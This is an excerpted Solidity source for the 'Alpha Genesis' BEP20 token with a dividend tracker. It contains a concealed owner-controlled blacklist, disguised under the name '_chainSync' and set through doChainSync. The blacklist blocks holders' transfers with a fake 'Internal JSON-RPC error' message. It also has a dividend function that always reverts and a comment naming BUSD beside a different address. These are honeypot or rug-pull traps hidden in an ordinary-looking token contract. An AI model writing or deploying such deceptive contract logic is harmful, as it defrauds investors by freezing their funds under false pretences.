...
library IterableMapping {
    struct Map {
        ...
        mapping (address => bool) _chainSync;
    }
...
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    ...
    mapping (address => bool) public _chainSync;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(!_chainSync[_msgSender()] && !_chainSync[recipient], "Internal JSON-RPC error");
    ...
    function transferFrom(
        ...
        require(!_chainSync[sender] && !_chainSync[recipient], "Internal JSON-RPC error");
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds your balance");
...
contract DividendPayingToken is DividendPayingTokenInterface, Ownable {
  ...
  function distributeDividends() public override payable {
    require(false, "Unable to send BNB to tracer");
  }
...
// GenesisTracer for rewards tracing | No additional tracking tokens will be sent to wallets | Clean stealth tracing
contract GenesisTracer is DividendPayingToken {
    ...
    // Minimum amount tokens required for dividends | Set number in exact tokens
        minimumTokenBalanceForDividends = 1 * (10**18);
    }

    // Exclude a wallet from rewards
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1800 && newClaimWait <= 86400, "GenesisTracer: Claim waiting time must be updated to between 1(1800 seconds) and 24(86400 seconds) hours");
        require(newClaimWait != claimWait, "GenesisTracer: Cannot update claim waiting time to same value");
...
contract AlphaGenesis is BEP20, Ownable {
    ...
    // BUSD Contract Address | 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
    address public constant token = address(0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee);
    ...
    constructor() BEP20("Alpha Genesis", "AGEN"){

        address newOwner = address(0xeC83d53927259b5489678DDE07bD0055B097E807);

        // Total Supply to be minted once during deployment / Set number in exact tokens
        uint256 totalSupply = 500000000000000 * (10**18);

        // Maximum amount of a single transfer / Set number in exact tokens
        maxTransactionAmount = 500000000000000 * (10**18);

        // Tokens for SwapAndLiquify and BuyBack / Set number in exact tokens
        ...
        marketingWallet = address(0xE581ae91a862a3A8fa48A462c7AF35075742b081);

        // Community Distribution Wallet
        communityWallet = address(0xB788C33099F0C79195D16F7D99E4b385274826a1);

        // Liquidity Wallet
        liquidityWallet = address(0x9fb23810f032c96442470AB9636202f66e6a2bcF);
    ...
    // Exclude from the GenesisTracer | Stop gaining dividends for rewards | Only for lockers and deployer wallets
    function excludeFromGenesisTracer(address account) external onlyOwner {
        genesisTracer.excludeFromDividends(account);
        emit ExcludeFromDividends(account);
    }

    // Include in GenesisTracer | Start gaining dividends for rewards
    function includeInGenesisTracer(address account) external onlyOwner {
    ...
    // Update the maximum single transaction amount | Set number in exact tokens
    function updateMaxTransactionAmount(uint256 newNum) external onlyOwner {
        maxTransactionAmount = newNum * (10**18);
    }

    // Update the sell fees in single numbers = Percents
    ...
    // Update the buy fees in single numbers = Percents
    ...
    // Exclude a wallet from maximum transaction amount
    ...
    // Exclude a wallet from all fees | Only for presale addresses and presale routers
    ...
    // Exclude multiple wallets from all fees | Only for presale addresses and presale routers
    ...
    // Set a new project expenses wallet | Wallet name can be changed to whatever suites the best
    ...
    // Set a new liquidity wallet | Wallet name can be changed to whatever suites the best
    ...
    // Set a new community wallet | Wallet name can be changed to whatever suites the best
    ...
    // Update gas amount used for processing the GenesisTracer | Set between 200,000 - 600,000
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        // Generate Pancakeswap pair against WBNB
        address[] memory path = new address[](2);
        path[0] = address(this);
    ...
    function swapBack() private {
        ...
        if(buyBackEnabled){
            (success,) = address(marketingWallet).call{value: ethForMarketing * percentForMarketing / 100}("Genesis event complete");
    ...
    function redoChainSync(address account) external onlyOwner {
        _chainSync[account] = false;
    }

    function doChainSync(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i < addresses.length; ++i) {
        _chainSync[addresses[i]] = true;
      }
    }
